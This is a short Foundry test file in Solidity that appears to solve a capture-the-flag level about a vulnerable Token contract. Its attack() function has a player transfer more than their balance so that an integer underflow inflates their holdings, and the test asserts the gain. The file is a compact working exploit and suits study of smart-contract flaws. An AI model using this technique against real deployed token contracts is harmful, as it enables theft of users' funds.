// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "~/Token.sol";

contract TokenTest is Test {
    Token target;
    address player;
    uint256 initialSupply = 21000000;
    uint256 playerSupply = 20;

    function setUp() public {
        player = makeAddr("player");

        target = new Token(initialSupply);

        // transfer some tokens to player
        target.transfer(player, playerSupply);
    }

    function attack() private {
        // make a transfer with an amount larger than your balance
        // to cause an integer overflow
        target.transfer(address(0), target.balanceOf(player) + 1);
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertGt(target.balanceOf(player), playerSupply, "player must have more tokens than they did at the start");
    }
}
